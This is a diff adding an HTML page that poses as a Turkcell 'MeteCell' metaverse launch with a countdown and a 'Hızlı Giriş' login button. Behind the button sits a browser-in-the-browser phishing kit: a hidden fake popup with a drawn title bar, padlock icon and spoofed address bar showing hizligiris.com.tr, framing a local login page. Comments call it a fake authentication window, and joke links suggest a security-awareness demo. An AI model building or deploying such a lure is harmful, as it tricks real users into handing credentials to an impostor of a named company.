@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Behavior for Dark and light themes -->
+    <style>
+        @import url('assets/css/style.css') (prefers-color-scheme: light);
+        @import url('assets/css/style-dark.css') (prefers-color-scheme: dark);
+    </style>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MeteCell - Türkcell'in Metaversei</title>
+    <!-- CSS -->
+    <link rel="stylesheet" href="assets/css/animate.css">
+    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Roboto:400,300,100,100italic,300italic,400italic,700,700italic">
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <!-- Font Awesome -->
+    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+<body>
+    <!-- Coming Soon -->
+    <div class="coming-soon">
+        <div class="inner-bg">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-12">
+                        <div class="logo wow fadeInDown">
+                            <!-- BipMeet Logo - Changed with CSS -->
+                            <h1>
+                                <a href="Siber Güvenlik :)" onclick="return launchWindow_Bipmeet();">Bipmeet Logo</a>
+                            </h1>
+                        </div>
+                        <!-- Count Down - To change the time go to the JS file-->
+                        <h2 style="margin-top: 10px; font-size: 42px; line-height: 54px; color: #ffc80c;">MetaCell ile <strong>Geleceğe </strong> hazır mısınız?</h2>
+                        <div class="timer wow fadeInUp">
+                            <div class="days-wrapper">
+                                <span class="days"></span> <br>Gün
+                            </div>
+                            <div class="hours-wrapper">
+                                <span class="hours"></span> <br>Saat
+                            </div>
+                            <div class="minutes-wrapper">
+                                <span class="minutes"></span> <br>Dakika
+                            </div>
+                            <div class="seconds-wrapper">
+                                <span class="seconds"></span> <br>Saniye
+                            </div>
+                        </div>
+                        <div class="wow fadeInDown">
+                            <p style="color: black; font-weight: 700;">
+                                MeteCell'i ilk sen denemek istiyorsan hemen kaydol.
+                            </p>
+
+                            <div class="m-login">
+                                <div style="color: wihte;" class="m-login__main">
+                                    <p>Hesabınıza Hızlı Giriş ile kolayca giriş yapabilirsiniz.</p>
+                                    <div>
+                                        <button id="clickme" class="rcorners1">
+                                            <img id="hizligiris-logo"src="BITB/favicon.ico" style="height: auto">
+                                            <span class='text'><strong style="color: black">Hızlı</strong>Giriş</span>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- BITB Part-->
+                        <!-- Hızlı Giriş Button -->
+                        <div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none; top: -600px; left: -410px;">
+                            <!-- Title bar start -->
+                            <div id="title-bar-width">
+                                <div id="title-bar">
+                                    <div style="margin-top:5px;">
+                                        <img src="BITB/favicon.ico" width="20" height="15" id="logo">
+                                        <span id="logo-description">Giriş Yap</span>
+                                    </div>
+
+                                    <div>
+                                        <span id="minimize">&#8212;</span>
+                                        <span id="square">□</span>
+                                        <span id="exit">✕</span>
+                                    </div>
+                                </div>
+                                <div id="url-bar">
+                                    <img src="BITB/ssl.svg" width="20" height="20" id="ssl-padlock">
+                                    <span id="domain-name">https://hizligiris.com.tr</span>
+                                    <span id="domain-path">/hizligiris/generic/login</span>
+                                </div>
+                            </div>
+                            <!-- Content start - iframe-->
+                            <iframe id="content" src='BITB/Fastlogin.html' frameBorder="0"></iframe>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-7 footer-copyright">
+                        <p>Copyright 2019 | All Rights Reserved - by <a href="Siber Güvenlik :)" onclick="return launchWindow_Turkcell();">Turkcell</a>
+                        </p>
+                    </div>
+                    <div class="col-sm-5 footer-social pull-right">
+                        <ul class="social-icon">
+                            <li><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"><i
+                                        class="fa fa-facebook-square"></i></a></li>
+                            <li><a href="https://twitter.com/eitatli?lang=en"><i class="fa fa-twitter-square"></i></a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Javascript -->
+    <script src="assets/js/jquery-1.10.2.min.js"></script>
+    <script src="assets/js/jquery.backstretch.min.js"></script>
+    <script src="assets/js/jquery.countdown.min.js"></script>
+    <script src="assets/js/wow.min.js"></script>
+    <script src="assets/js/scripts.js"></script>
+    <script>
+
+        function launchWindow_Turkcell(){
+            // Launch the fake authentication window
+            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley", "_blank");
+        }
+        function launchWindow_Bipmeet(){
+            // Launch the fake authentication window
+            window.open("https://www.turkcell.com.tr/servisler/bip-meet", "_blank");
+        }
+
+    </script>
+
+</body>
+
+</html>
